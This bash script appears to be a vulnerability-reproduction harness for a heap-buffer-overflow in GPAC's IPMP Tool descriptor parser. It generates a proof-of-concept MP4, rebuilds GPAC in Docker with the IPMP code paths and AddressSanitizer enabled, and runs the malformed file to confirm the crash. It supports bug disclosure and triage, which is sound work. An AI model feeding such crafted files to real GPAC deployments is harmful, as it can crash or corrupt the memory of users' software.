#!/bin/bash
# Reproduce: GPAC IPMP Tool descriptor heap-buffer-overflow
#
# This bug is NOT reachable in the OSS-Fuzz build (GPAC_MINIMAL_ODF is defined).
# Reproduction requires rebuilding GPAC with GPAC_MINIMAL_ODF disabled and
# compiling a custom harness that calls gf_isom_open_file().
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
IMAGE="${1:-revelio/gpac:latest}"

echo "[*] Generating PoC MP4..."
python3 "$SCRIPT_DIR/gen_poc.py" 30

echo "[*] Building custom harness inside $IMAGE (disabling GPAC_MINIMAL_ODF)..."
docker run --rm \
  -v "$SCRIPT_DIR":/exploit:ro \
  "$IMAGE" bash -c '
set -e
cd /src/gpac

# 1. Disable GPAC_MINIMAL_ODF to enable IPMP code paths
sed -i "s/^#define GPAC_MINIMAL_ODF$/\/\/#define GPAC_MINIMAL_ODF/" include/gpac/setup.h

# 2. Compiler flags (ASan + libFuzzer)
export CC=clang CXX=clang++
CF="-O1 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION"

# 3. Rebuild static library with IPMP enabled
./configure --static-build --extra-cflags="$CF" --extra-ldflags="$CF" >/dev/null 2>&1
make -j$(nproc) lib >/dev/null 2>&1

# 4. Compile excluded ODF modules and add to archive
for src in src/odf/qos.c src/odf/ipmpx_code.c src/odf/oci_codec.c src/odf/ipmpx_dump.c src/odf/ipmpx_parse.c; do
    $CC $CF -I./include -I./ -DGPAC_HAVE_CONFIG_H -c "$src" -o "/tmp/$(basename $src .c).o" 2>/dev/null
done
ar rcs bin/gcc/libgpac_static.a /tmp/qos.o /tmp/ipmpx_code.o /tmp/oci_codec.o /tmp/ipmpx_dump.o /tmp/ipmpx_parse.o

# 5. Build the harness
$CC $CF -I./include -I./ -DGPAC_HAVE_CONFIG_H -c /exploit/harness.c -o /tmp/harness.o
$CXX $CF -fsanitize=address,fuzzer -o /tmp/fuzz_ipmp /tmp/harness.o \
    bin/gcc/libgpac_static.a -lm -lz -lpthread -lssl -lcrypto

echo "[*] Running PoC..."
/tmp/fuzz_ipmp /exploit/poc.mp4 2>&1 | grep -E "AddressSanitizer|ERROR|SUMMARY|heap-buffer-overflow" || true
'
echo "[*] Done."
